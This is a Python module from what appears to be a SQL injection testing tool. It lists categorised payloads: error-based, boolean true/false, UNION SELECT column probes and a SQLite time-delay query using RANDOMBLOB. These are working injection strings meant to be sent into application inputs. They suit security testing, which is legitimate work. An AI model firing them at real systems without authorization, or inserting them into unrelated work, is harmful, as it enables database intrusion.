# sqli_tool/payloads.py

# Categorized payloads for different SQLi types
ERROR_BASED = ["'"]

BOOLEAN_BASED = {
    "true": ["' OR 1=1 --", "' AND 1=1 --"],
    "false": ["' OR 1=0 --", "' AND 1=0 --"]
}

UNION_BASED = [
    "' UNION SELECT NULL,NULL --", # 2 columns
    "' UNION SELECT NULL,NULL,NULL --", # 3 columns
    "' UNION SELECT 'injection_test',NULL --"
]

# SQLite specific time-based payload
TIME_BASED = [
    "' AND (SELECT UPPER(HEX(RANDOMBLOB(500000000)))) --",
]
